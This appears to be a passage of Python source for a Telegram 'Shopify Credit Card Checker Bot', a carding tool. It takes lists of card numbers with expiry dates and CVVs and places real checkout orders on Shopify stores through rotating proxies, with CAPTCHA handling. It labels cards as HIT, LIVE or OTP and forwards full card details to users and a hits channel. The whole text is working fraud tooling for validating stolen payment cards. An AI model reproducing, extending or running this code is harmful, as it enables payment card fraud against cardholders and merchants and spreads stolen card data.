                        'address1': street, 'address2': address2, 'city': city,
                        'countryCode': country_code, 'postalCode': s_zip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': state, 'phone': phone
                    }
                }
                json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
                json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                )
                
                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency, receipt_id, order_url

                formattedCard = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
                payload = {
                    "credit_card": {
                        "month": mes,
                        "name": f"{firstName} {lastName}",
                        "number": formattedCard,
                        "verification_value": cvv,
                        "year": ano,
                        "start_month": "",
                        "start_year": "",
                        "issue_number": ""
                    },
                    "payment_session_scope": f"www.{urlparse(url).netloc}"
                }
                
                response = await session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy)
                try:
                    token_data = await response.json()
                    token = token_data.get('id')
                    if not token:
                        return False, 'Unable to get payment token', gateway, total_price, currency, receipt_id, order_url
                except Exception as e:
                    return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency, receipt_id, order_url

                params = {'operationName': 'SubmitForCompletion'}
                
                submit_variables = {
                    'input': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queueToken or '',
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'streetAddress': {
                                        'address1': street, 'address2': address2, 'city': city,
                                        'countryCode': country_code, 'postalCode': s_zip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': state, 'phone': phone
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyByHandle': {
                                        'handle': delivery_strategy if delivery_strategy else '',
                                        'customDeliveryRate': False
                                    },
                                    'options': {'phone': phone}
                                },
                                'targetMerchandiseLines': {
                                    'lines': [{'stableId': stableId or '1'}]
                                },
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {
                                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                                },
                                'destinationChanged': False
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': True,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stableId or '1',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None
                                    }
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {
                                    'value': {'amount': subtotal, 'currencyCode': currency}
                                },
                                'lineComponentsSource': None,
                                'lineComponents': []
                            }]
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': payment_identifier,
                                        'sessionId': token,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': street, 'address2': address2,
                                                'city': city, 'countryCode': country_code,
                                                'postalCode': s_zip, 'firstName': firstName,
                                                'lastName': lastName, 'zoneCode': state,
                                                'phone': phone
                                            }
                                        },
                                        'cardSource': None
                                    }
                                },
                                'amount': {
                                    'value': {'amount': running_total, 'currencyCode': currency}
                                },
                                'dueAt': None
                            }],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2,
                                    'city': city, 'countryCode': country_code,
                                    'postalCode': s_zip, 'firstName': firstName,
                                    'lastName': lastName, 'zoneCode': state,
                                    'phone': phone
                                }
                            }
                        },
                        'buyerIdentity': {
                            'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                            'email': email,
                            'emailChanged': False,
                            'phoneCountryCode': country_code,
                            'marketingConsent': [{'email': {'value': email}}],
                            'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                            'rememberMe': False
                        },
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {
                                'value': {'amount': str(tax_amount), 'currencyCode': currency}
                            },
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': []
                        },
                        'tip': {'tipLines': []},
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'optionalDuties': {'buyerRefusesDuties': False}
                    },
                    'attemptToken': attempt_token,
                    'metafields': [],
                    'analytics': {'requestUrl': checkout_url}
                }
                
                if checkpoint_data:
                    submit_variables['input']['checkpointData'] = checkpoint_data
                
                submit_json_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': submit_variables,
                    'operationName': 'SubmitForCompletion'
                }

                response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
                )
                
                if is_captcha_required(text):
                    return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency, receipt_id, order_url
                
                if "Your order total has changed." in text:
                    return False, "Site not supported", gateway, total_price, currency, receipt_id, order_url
                if "The requested payment method is not available." in text:
                    return False, "Payment method not available", gateway, total_price, currency, receipt_id, order_url
                
                try:
                    resp_json = json.loads(text)
                    submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                    
                    if not submit_data:
                        errors = resp_json.get('errors', [])
                        if errors:
                            for error in errors:
                                code = error.get('code')
                                if code:
                                    return False, code, gateway, total_price, currency, receipt_id, order_url
                        return False, "Empty submit response", gateway, total_price, currency, receipt_id, order_url
                    
                    result_type = submit_data.get('__typename', '')
                    
                    if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                        receipt = submit_data.get('receipt', {})
                        if receipt:
                            receipt_type = receipt.get('__typename', '')
                            
                            if receipt_type == 'ProcessedReceipt':
                                receipt_id = receipt.get('id')
                                order_url = receipt.get('orderStatusPageUrl')
                                return True, "ORDER_PLACED", gateway, total_price, currency, receipt_id, order_url
                            
                            rid = receipt.get('id')
                        else:
                            return False, "SubmitSuccess but no receipt", gateway, total_price, currency, receipt_id, order_url
                    
                    elif result_type == 'SubmitFailed':
                        reason = submit_data.get('reason', 'Unknown reason')
                        return False, extract_clean_response(reason), gateway, total_price, currency, receipt_id, order_url
                    
                    elif result_type == 'SubmitRejected':
                        errors = submit_data.get('errors', [])
                        if errors:
                            for error in errors:
                                code = error.get('code')
                                if code:
                                    return False, code, gateway, total_price, currency, receipt_id, order_url
                        return False, "Submit Rejected", gateway, total_price, currency, receipt_id, order_url
                    
                    elif result_type == 'Throttled':
                        return False, "Throttled", gateway, total_price, currency, receipt_id, order_url
                    
                    receipt = submit_data.get('receipt', {})
                    if not receipt:
                        return False, "No receipt in submit response", gateway, total_price, currency, receipt_id, order_url
                    
                    rid = receipt.get('id')
                    if not rid:
                        return False, "No receipt ID", gateway, total_price, currency, receipt_id, order_url
                    
                except json.JSONDecodeError:
                    return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency, receipt_id, order_url
                except Exception as e:
                    return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency, receipt_id, order_url

                params = {'operationName': 'PollForReceipt'}
                poll_json_data = {
                    'query': QUERY_POLL,
                    'variables': {'receiptId': rid, 'sessionToken': sst},
                    'operationName': 'PollForReceipt'
                }

                await asyncio.sleep(1.5)
                
                receipt_resp_json = None
                final_text = ""
                for i in range(4):
                    response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, params, headers, poll_json_data,
                        checkout_url, max_retries=1
                    )
                    
                    if is_captcha_required(final_text):
                        return True, "CARD_DECLINED", gateway, total_price, currency, receipt_id, order_url
                    
                    try:
                        receipt_resp_json = json.loads(final_text)
                        receipt_data = receipt_resp_json.get('data', {}).get('receipt', {})

                        if receipt_data:
                            typename = receipt_data.get('__typename', '')
                            if typename == 'ProcessedReceipt' or any(k in final_text for k in success_keys):
                                receipt_id = receipt_data.get('id')
                                order_url = receipt_data.get('orderStatusPageUrl')
                                return True, "ORDER_PLACED", gateway, total_price, currency, receipt_id, order_url
                            elif typename == 'ActionRequiredReceipt' or any(k in final_text for k in twofactor_keys):
                                return True, "OTP_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                            
                            elif typename == 'INCORRECT_CVC' or any(k in final_text for k in ccn_keys):
                                return True, "INCORRECT_CVC", gateway, total_price, currency, receipt_id, order_url
                            
                            elif typename == 'INSUFFICIENT_FUNDS':
                                return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency, receipt_id, order_url
                                
                            elif typename == 'FailedReceipt' or any(k in final_text for k in fail_keys):
                                error = receipt_data.get('processingError', {})
                                code = error.get('code', 'UNKNOWN_ERROR')
                                return True, code, gateway, total_price, currency, receipt_id, order_url

                            if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                                await asyncio.sleep(2)
                                continue
                            
                    except Exception as e:
                        pass
                    
                    if 'WaitingReceipt' in final_text:
                        await asyncio.sleep(2)
                    else:
                        break
                
                if 'CAPTCHA_REQUIRED' in final_text:
                    return True, "CARD_DECLINED", gateway, total_price, currency, receipt_id, order_url
                
                if 'WaitingReceipt' in final_text:
                    return False, "Change Proxy or Site", gateway, total_price, currency, receipt_id, order_url
                
                                

        except Exception as e:
            if attempt < max_retries:
                # Try with new proxy if available
                user_proxies = await get_user_proxies(user_id)
                if user_proxies:
                    available_proxies = [p for p in user_proxies if p != proxy_str]
                    if available_proxies:
                        proxy_str = random.choice(available_proxies)
                        proxy = parse_proxy(proxy_str)
                        logger.info(f"Retrying after exception with new proxy for user {user_id}")
                        continue
            return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency, receipt_id, order_url
        
        # If we got here without issues, break the retry loop
        break

    return False, "Max retries exceeded", gateway, total_price, currency, receipt_id, order_url

async def remove_dead_site(user_id, site_url):
    """Remove dead site from user's sites"""
    try:
        await user_sites_col.update_one(
            {'user_id': user_id},
            {'$pull': {'sites': {'url': site_url}}}
        )
    except Exception as e:
        logger.error(f"Error removing dead site: {e}")

async def save_working_site(user_id, site_url, product_info):
    """Save working site with product info to user's sites"""
    try:
        site_url = normalize_site_url(site_url)
        try:
            product_price = float(str(product_info.get('price', '0')).replace(',', '').strip())
        except Exception:
            return False, "Invalid product price"

        if product_price > MAX_SITE_PRODUCT_PRICE:
            return False, f"Cheapest product ${product_price:.2f} is above ${MAX_SITE_PRODUCT_PRICE:.2f}"

        # Check if user already has max sites
        user_sites_doc = await user_sites_col.find_one({'user_id': user_id})
        current_count = len(user_sites_doc.get('sites', [])) if user_sites_doc else 0
        
        if current_count >= MAX_SITES_PER_USER:
            return False, f"Maximum site limit reached ({MAX_SITES_PER_USER})"
        
        # Check if site already exists for user
        if user_sites_doc:
            existing_sites = [s.get('url') if isinstance(s, dict) else s for s in user_sites_doc.get('sites', [])]
            if site_url in existing_sites:
                return True, "Site already exists"
        
        # Add site
        site_entry = {
            'url': site_url,
            'price': f"{product_price:.2f}",
            'variant_id': product_info.get('variant_id'),
            'product_link': product_info.get('link'),
            'last_checked': datetime.utcnow()
        }
        
        await user_sites_col.update_one(
            {'user_id': user_id},
            {
                '$addToSet': {
                    'sites': site_entry
                }
            },
            upsert=True
        )
        return True, "Site added successfully"
    except Exception as e:
        logger.error(f"Error saving working site: {e}")
        return False, str(e)

async def update_task_progress(message_id, stats, start_time=None):
    """Update task progress message with buttons"""
    try:
        if message_id not in task_messages:
            return
        
        message = task_messages[message_id]
        
        if start_time is None:
            start_time = task_stats[message_id].get('start_time', datetime.now())
        
        elapsed = datetime.now() - start_time
        elapsed_str = str(elapsed).split('.')[0]  # Remove microseconds
        
        # Get user info
        user_id = task_users.get(message_id)
        user = await users_col.find_one({'user_id': user_id}) if user_id else None
        user_name = user.get('first_name', 'User') if user else 'User'
        
        # Create progress text
        progress_text = f"""TASK
USER: {user_name}
START TIME: {start_time.strftime('%H:%M:%S')}
ELAPSED: {elapsed_str}

CREATED BY @still_alivenow"""

        # Create buttons
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(f"TOTAL {stats.get('total', 0)}", callback_data="ignore"),
                InlineKeyboardButton(f"CHECKED {stats.get('checked', 0)}", callback_data="ignore")
            ],
            [
                InlineKeyboardButton(f"HIT {stats.get('hit', 0)}", callback_data="ignore"),
                InlineKeyboardButton(f"LIVE {stats.get('live', 0)}", callback_data="ignore")
            ],
            [
                InlineKeyboardButton(f"OTP {stats.get('otp', 0)}", callback_data="ignore"),
                InlineKeyboardButton(f"FAILED {stats.get('failed', 0)}", callback_data="ignore")
            ]
        ])
        
        try:
            await message.edit_text(
                text=progress_text,
                reply_markup=keyboard,
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            # Handle "Message not modified" error silently
            if "MESSAGE_NOT_MODIFIED" not in str(e):
                logger.error(f"Error updating progress: {e}")
                
    except Exception as e:
        logger.error(f"Error in update_task_progress: {e}")

# Task queue worker
async def task_worker(worker_id):
    """Worker to process tasks from queue"""
    logger.info(f"Worker {worker_id} started")
    while True:
        try:
            task = await TASK_QUEUE.get()
            if task is None:
                break
            
            user_id = task['user_id']
            cc_data = task['cc_data']
            site = task['site']
            proxy = task.get('proxy')
            message = task['message']
            task_type = task['type']
            task_id = task.get('task_id')
            if task_id:
                active_tasks[task_id] = {
                    'user_id': user_id,
                    'task_type': task_type,
                    'status': 'processing',
                    'site': site,
                    'started_at': datetime.utcnow(),
                    'worker_id': worker_id
                }
            
            # Process the card
            start_time = time.time()
            success, response, gateway, price, currency, receipt_id, order_url = await process_card(
                cc_data['cc'], cc_data['mes'], cc_data['ano'], cc_data['cvv'],
                site, user_id, proxy
            )
            process_time = round(time.time() - start_time, 2)
            
            # Get BIN info
            bin_number = cc_data['cc'][:6]
            bin_info = await get_bin_info(bin_number)
            
            # Prepare result
            result = {
                'user_id': user_id,
                'cc': f"{cc_data['cc']}|{cc_data['mes']}|{cc_data['ano'][-2:]}|{cc_data['cvv']}",
                'full_cc': f"{cc_data['cc']}|{cc_data['mes']}|{cc_data['ano']}|{cc_data['cvv']}",
                'status': success,
                'response': response,
                'gateway': gateway,
                'price': price,
                'currency': currency,
                'site': site,
                'bin_info': bin_info,
                'receipt_id': receipt_id,
                'order_url': order_url,
                'process_time': process_time,
                'message': message,
                'task_type': task_type,
                'task_id': task_id
            }
            
            # Put result in queue
            await RESULT_QUEUE.put(result)
            
            TASK_QUEUE.task_done()
            
        except Exception as e:
            logger.error(f"Worker {worker_id} error: {e}")
            if 'task_id' in locals() and task_id:
                active_tasks.pop(task_id, None)
            TASK_QUEUE.task_done()

# Result handler
async def result_handler():
    """Handle results from queue and send to users"""
    logger.info("Result handler started")
    
    while True:
        try:
            result = await RESULT_QUEUE.get()
            
            user_id = result['user_id']
            cc = result['cc']
            full_cc = result['full_cc']
            status = result['status']
            response = result['response']
            gateway = result['gateway']
            price = result['price']
            currency = result['currency']
            site = result['site']
            bin_info = result['bin_info']
            receipt_id = result.get('receipt_id', '')
            order_url = result.get('order_url', '')
            process_time = result.get('process_time', 0)
            original_message = result.get('message')
            task_type = result.get('task_type', 'single')
            task_id = result.get('task_id')
            
            # Get user's first name from database
            user = await users_col.find_one({'user_id': user_id})
            first_name = user.get('first_name', 'User') if user else 'User'
            
            # Determine hit status - FIXED VERSION
            hit_status = "failed"
            
            # Check for HIT status
            if response in ['ORDER_PLACED', 'ProcessedReceipt', 'CHARGED'] or any(k in str(response) for k in success_keys):
                hit_status = "hit"
            # Check for OTP status
            elif response in ['OTP_REQUIRED', 'ACTION_REQUIRED', '2FACTOR'] or any(k in str(response) for k in twofactor_keys):
                hit_status = "otp"
            # Check for LIVE status
            elif response in ['CCN', 'INCORRECT_CVC', 'INSUFFICIENT_FUNDS'] or any(k in str(response) for k in ccn_keys):
                hit_status = "live"
            
            # Format site name - FIXED to get domain correctly
            site_name = site.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
            
            # Format receipt with clickable order URL
            receipt_text = ""
            if receipt_id:
                if order_url and order_url != 'N/A' and order_url:
                    receipt_text = f"🧾 <a href='{order_url}'>View Order</a>"
                else:
                    receipt_text = f"🧾 Receipt: <code>{receipt_id}</code>"
            
            # Format message with click-to-copy card
            if hit_status == "hit":
                status_emoji = "🟢"
                status_text = "HIT"
            elif hit_status == "otp":
                status_emoji = "🟡"
                status_text = "OTP"
            elif hit_status == "live":
                status_emoji = "🟢"
                status_text = "LIVE"
            else:
                status_emoji = "🔴"
                status_text = "DECLINED"
            
            # Format price to 2 decimal places if it's a number
            try:
                formatted_price = round(float(price), 2)
            except (ValueError, TypeError):
                formatted_price = price
            
            formatted_message = f"""{status_emoji} {status_text}

💳 Card: <code>{full_cc}</code>
🔐 Code: {response}
🎫 BIN: {bin_info.get('bin', 'N/A')} [{bin_info.get('brand', 'UNKNOWN')}] {bin_info.get('type', '')} ({bin_info.get('level', '')}) - {bin_info.get('bank', 'UNKNOWN')}
🌍 Country: {bin_info.get('country_flag', '🏳️')} {bin_info.get('country_name', 'UNKNOWN')}
🌐 Site: {site_name}
💰 Amount: {formatted_price} {currency}
{receipt_text}
⚡ Time: {process_time}s
👤 User: {first_name}

by @still_alivenow"""
            
            # Send result to user based on task type
            if task_type == 'single':
                # Send all responses for /chk command
                try:
                    await app.send_message(
                        chat_id=user_id,
                        text=formatted_message,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                    if HIT_CHANNEL and hit_status in ['hit', 'live']:
                        await asyncio.sleep(0.3)
                        await app.send_message(
                            chat_id=HIT_CHANNEL,
                            text=formatted_message,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True
                        )
                except Exception as e:
                    logger.error(f"Error sending message to user {user_id}: {e}")
            
            elif task_type in ['mchk', 'chksite']:
                # For mass checks, only send HIT and LIVE cards
                if hit_status in ['hit', 'live', 'otp']:
                    try:
                        await app.send_message(
                            chat_id=user_id,
                            text=formatted_message,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True
                        )
                        if HIT_CHANNEL and hit_status in ['hit', 'live']:
                            await asyncio.sleep(0.3)
                            await app.send_message(
                                chat_id=HIT_CHANNEL,
                                text=formatted_message,
                                parse_mode=ParseMode.HTML,
                                disable_web_page_preview=True
                            )
                    
                    except Exception as e:
                        logger.error(f"Error sending hit message to user {user_id}: {e}")
            
            # Update progress for batch tasks
            if task_type in ['mchk', 'chksite'] and original_message:
                try:
                    # Initialize stats for this progress message
                    msg_id = original_message.id if hasattr(original_message, 'id') else str(original_message)
                    
                    if msg_id not in task_stats:
                        task_stats[msg_id] = {
                            'total': 1,
                            'checked': 0,
                            'hit': 0,
                            'live': 0,
                            'otp': 0,
                            'failed': 0,
                            'start_time': datetime.now()
                        }
                        task_messages[msg_id] = original_message
                        task_users[msg_id] = user_id
                    
                    # Update stats
                    task_stats[msg_id]['checked'] += 1
                    if hit_status == 'hit':
                        task_stats[msg_id]['hit'] += 1
                    elif hit_status == 'live':
                        task_stats[msg_id]['live'] += 1
                    elif hit_status == 'otp':
                        task_stats[msg_id]['otp'] += 1
                    else:
                        task_stats[msg_id]['failed'] += 1
                    
                    # Update progress message
                    await update_task_progress(msg_id, task_stats[msg_id])
                    
                    # Clean up if task is complete
                    if task_stats[msg_id]['checked'] >= task_stats[msg_id]['total']:
                        # Keep stats for a while then clean up
                        asyncio.create_task(cleanup_task_data(msg_id, delay=300))
                            
                except Exception as e:
                    logger.error(f"Error updating progress: {e}")

            if task_id:
                active_tasks.pop(task_id, None)
            
            RESULT_QUEUE.task_done()
            
        except Exception as e:
            logger.error(f"Result handler error: {e}")
            if 'task_id' in locals() and task_id:
                active_tasks.pop(task_id, None)
            RESULT_QUEUE.task_done()

async def cleanup_task_data(msg_id, delay=300):
    """Clean up task data after delay"""
    await asyncio.sleep(delay)
    task_stats.pop(msg_id, None)
    task_messages.pop(msg_id, None)
    task_users.pop(msg_id, None)

# Callback query handler
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    """Handle callback queries from inline buttons"""
    await callback_query.answer()  # Just acknowledge the callback

# Database functions
async def init_db():
    """Initialize database collections and indexes"""
    try:
        # Users collection indexes
        await users_col.create_index('user_id', unique=True)
        
        # Proxies collection indexes
        await proxies_col.create_index([('user_id', 1), ('proxy', 1)], unique=True)
        
        # Sites collection indexes
        await sites_col.create_index('url', unique=True)
        
        # User sites collection indexes
        await user_sites_col.create_index([('user_id', 1), ('sites.url', 1)])
        
        logger.info("Database initialized successfully")
    except Exception as e:
        logger.error(f"Database initialization error: {e}")

async def get_user_proxies(user_id):
    """Get all proxies for a user"""
    cursor = proxies_col.find({'user_id': user_id})
    proxies = await cursor.to_list(length=None)
    return [p['proxy'] for p in proxies]

async def add_user_proxy(user_id, proxy):
    """Add a proxy for a user"""
    try:
        await proxies_col.update_one(
            {'user_id': user_id, 'proxy': proxy},
            {'$set': {'user_id': user_id, 'proxy': proxy, 'added_at': datetime.utcnow()}},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error adding proxy: {e}")
        return False

async def delete_user_proxy(user_id, proxy=None):
    """Delete proxy(s) for a user"""
    try:
        if proxy:
            result = await proxies_col.delete_one({'user_id': user_id, 'proxy': proxy})
            return result.deleted_count > 0
        else:
            result = await proxies_col.delete_many({'user_id': user_id})
            return result.deleted_count > 0
    except Exception as e:
        logger.error(f"Error deleting proxy: {e}")
        return False

async def get_all_proxies():
    """Get all proxies from all users"""
    cursor = proxies_col.find({})
    proxies = await cursor.to_list(length=None)
    return proxies

async def get_user_sites(user_id):
    """Get all working sites for a user"""
    user_sites = await user_sites_col.find_one({'user_id': user_id})
    if user_sites and 'sites' in user_sites:
        return [site['url'] if isinstance(site, dict) else site for site in user_sites['sites']]
    return []

async def get_all_sites():
    """Get all global sites"""
    cursor = sites_col.find({})
    sites = await cursor.to_list(length=None)
    return [s['url'] for s in sites]

async def add_global_site(site_url):
    """Add a site to global sites"""
    try:
        # Check global site limit
        current_count = await sites_col.count_documents({})
        if current_count >= MAX_GLOBAL_SITES:
            return False, f"Maximum global site limit reached ({MAX_GLOBAL_SITES})"
        
        await sites_col.update_one(
            {'url': site_url},
            {'$set': {'url': site_url, 'added_at': datetime.utcnow()}},
            upsert=True
        )
        return True, "Site added successfully"
    except Exception as e:
        logger.error(f"Error adding global site: {e}")
        return False, str(e)

async def delete_global_site(site_url=None):
    """Delete global site(s)"""
    try:
        if site_url:
            result = await sites_col.delete_one({'url': site_url})
            return result.deleted_count > 0
        else:
            result = await sites_col.delete_many({})
            return result.deleted_count > 0
    except Exception as e:
        logger.error(f"Error deleting global site: {e}")
        return False

async def get_random_site(user_id):
    """Get a random working site for user, fallback to global sites"""
    # Try user's working sites first
    user_sites = await get_user_sites(user_id)
    if user_sites:
        return random.choice(user_sites)
    
    # Fallback to global sites
    global_sites = await get_all_sites()
    if global_sites:
        return random.choice(global_sites)
    
    return None

async def save_user(user_id, first_name, username=None):
    """Save or update user in database"""
    try:
        await users_col.update_one(
            {'user_id': user_id},
            {
                '$set': {
                    'first_name': first_name,
                    'username': username,
                    'last_seen': datetime.utcnow()
                },
                '$setOnInsert': {
                    'joined_at': datetime.utcnow(),
                    'total_checks': 0
                }
            },
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving user: {e}")

async def increment_user_checks(user_id):
    """Increment user's total checks count"""
    try:
        await users_col.update_one(
            {'user_id': user_id},
            {'$inc': {'total_checks': 1}}
        )
    except Exception as e:
        logger.error(f"Error incrementing user checks: {e}")

async def get_user_stats(user_id):
    """Get user statistics"""
    user = await users_col.find_one({'user_id': user_id})
    if not user:
        return None
    
    proxy_count = await proxies_col.count_documents({'user_id': user_id})
    sites_count = len(await get_user_sites(user_id))
    active_task_stats = get_active_task_stats(user_id)
    
    return {
        'user_id': user_id,
        'first_name': user.get('first_name', 'Unknown'),
        'username': user.get('username'),
        'joined_at': user.get('joined_at'),
        'last_seen': user.get('last_seen'),
        'total_checks': user.get('total_checks', 0),
        'proxy_count': proxy_count,
        'sites_count': sites_count,
        'active_tasks': active_task_stats['active_total'],
        'active_queued': active_task_stats['active_queued'],
        'active_processing': active_task_stats['active_processing']
    }

# Bot commands
@app.on_message(filters.command('start'))
async def start_command(client, message):
    """Start command handler"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    welcome_text = f"""👋 Welcome {user.first_name}!

I'm a Shopify Credit Card Checker Bot. Here are my commands:

🔹 <b>Single Check</b>
/chk CC|MM|YYYY|CVV - Check a single card (all responses sent)

🔹 <b>Mass Check</b>
/mchk - Send up to 15 cards (one per line) or reply to a .txt file (only hits/live cards sent)

🔹 <b>Site Checker</b>
/chksite - Test sites and get working ones (reply to .txt file with sites)

🔹 <b>Proxy Management</b>
/addproxy - Add proxies (one per line) or reply to .txt
/delproxy - Delete all your proxies
/showproxy - Show your saved proxies

🔹 <b>Site Management</b>
/addsite [site] - Check site and get cheapest product
/showsites - Show all your working sites
/rmvsite - Remove sites from your list

🔹 <b>Info</b>
/stats - Show your statistics

<b>Admin Only Commands:</b>
/loadsite - Add global sites (max {MAX_GLOBAL_SITES})
/delsite - Delete global sites

Bot automatically selects random sites from your working sites or global sites.
Dead sites are automatically removed."""

    await message.reply_text(welcome_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

@app.on_message(filters.command('chk') & filters.private)
async def chk_command(client, message):
    """Single card check command"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Check if command has arguments or is reply
    if len(message.command) > 1:
        cc_string = message.command[1]
    elif message.reply_to_message and message.reply_to_message.text:
        cc_string = message.reply_to_message.text.strip()
    else:
        await message.reply_text("❌ Please provide a card in format: CC|MM|YYYY|CVV", disable_web_page_preview=True)
        return
    
    # Parse CC
    try:
        cc_parts = parse_cc_string(cc_string)
    except ValueError as e:
        await message.reply_text(f"❌ {str(e)}", disable_web_page_preview=True)
        return
    
    # Get user's proxy
    user_proxies = await get_user_proxies(user.id)
    proxy = random.choice(user_proxies) if user_proxies else None
    
    # Get random site
    site = await get_random_site(user.id)
    if not site:
        await message.reply_text("❌ No sites available! Please ask admin to add sites.", disable_web_page_preview=True)
        return
    
    # Send processing message
    processing_msg = await message.reply_text(
        f"🔄 Processing card...\n"
        f"💳 Card: {cc_parts['cc']}\n"
        f"🌐 Site: {site}\n"
        f"🔌 Proxy: {'Yes' if proxy else 'No'}",
        disable_web_page_preview=True
    )
    
    # Generate task ID
    task_id = f"{user.id}_{int(time.time())}_{random.randint(1000, 9999)}"
    active_tasks[task_id] = {
        'user_id': user.id,
        'task_type': 'single',
        'status': 'queued',
        'site': site,
        'created_at': datetime.utcnow()
    }
    
    # Add to task queue
    await TASK_QUEUE.put({
        'user_id': user.id,
        'cc_data': cc_parts,
        'site': site,
        'proxy': proxy,
        'message': processing_msg,
        'type': 'single',
        'task_id': task_id
    })
    
    await increment_user_checks(user.id)

@app.on_message(filters.command('mchk') & filters.private)
async def mchk_command(client, message):
    """Mass card check command (up to 15 cards)"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get cards from command or reply
    cards = []
    if len(message.command) > 1:
        # Cards from command arguments
        cards_text = ' '.join(message.command[1:])
        cards = [line.strip() for line in cards_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            # Handle file upload
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                cards = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            # Handle text reply
            cards = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not cards:
        await message.reply_text("❌ Please provide cards (one per line, max 15)", disable_web_page_preview=True)
        return
    
    cards = cards
    
    # Validate cards
    valid_cards = []
    invalid_cards = []
    for card in cards:
        try:
            cc_parts = parse_cc_string(card)
            valid_cards.append((card, cc_parts))
        except ValueError:
            invalid_cards.append(card)
    
    if invalid_cards:
        await message.reply_text(f"❌ Invalid cards found: {len(invalid_cards)}", disable_web_page_preview=True)
        return
    
    # Get user's proxies
    user_proxies = await get_user_proxies(user.id)
    
    # Get user's sites
    user_sites = await get_user_sites(user.id)
    if not user_sites:
        global_sites = await get_all_sites()
        if not global_sites:
            await message.reply_text("❌ No sites available! Please ask admin to add sites.", disable_web_page_preview=True)
            return
        sites = [random.choice(global_sites) for _ in range(len(valid_cards))]
    else:
        sites = [random.choice(user_sites) for _ in range(len(valid_cards))]
    
    # Create progress message
    progress_text = f"""TASK
USER: {user.first_name}
START TIME: {datetime.now().strftime('%H:%M:%S')}
ELAPSED: 0:00:00

CREATED BY @still_alivenow"""

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"TOTAL {len(valid_cards)}", callback_data="ignore"),
            InlineKeyboardButton(f"CHECKED 0", callback_data="ignore")
        ],
        [
            InlineKeyboardButton(f"HIT 0", callback_data="ignore"),
            InlineKeyboardButton(f"LIVE 0", callback_data="ignore")
        ],
        [
            InlineKeyboardButton(f"OTP 0", callback_data="ignore"),
            InlineKeyboardButton(f"FAILED 0", callback_data="ignore")
        ]
    ])
    
    processing_msg = await message.reply_text(
        text=progress_text,
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )
    
    # Store task info
    msg_id = processing_msg.id
    task_stats[msg_id] = {
        'total': len(valid_cards),
        'checked': 0,
        'hit': 0,
        'live': 0,
        'otp': 0,
        'failed': 0,
        'start_time': datetime.now()
    }
    task_messages[msg_id] = processing_msg
